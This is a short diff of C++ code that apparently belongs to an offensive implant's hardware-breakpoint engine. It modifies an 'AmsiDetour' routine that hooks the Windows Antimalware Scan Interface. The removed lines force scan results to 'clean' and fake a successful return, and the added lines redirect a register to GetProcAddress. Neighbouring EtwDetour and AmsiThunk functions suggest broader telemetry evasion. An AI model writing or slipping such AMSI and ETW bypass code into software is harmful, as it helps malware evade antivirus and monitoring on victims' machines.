@@ -455,14 +455,9 @@ auto DECLFN HwbpEng::EtwDetour(
 auto DECLFN HwbpEng::AmsiDetour(
     _In_ PCONTEXT Ctx
 ) -> VOID {
-	UPTR   Return     = *(PULONG_PTR)Ctx->Rsp;
-	PULONG ScanResult = (PULONG)(*(PULONG_PTR)(Ctx->Rsp + (6 * sizeof(PVOID))));
+	Ctx->Rdx = (UPTR)Self->Krnl32.GetProcAddress;
 
-	*ScanResult = 0;
-
-	Ctx->Rip  = Return;
-	Ctx->Rsp += sizeof(PVOID);
-	Ctx->Rax  = S_OK;
+    CONTINUE_EXEC( Ctx );
 }
 
 auto DECLFN HwbpEng::AmsiThunk(
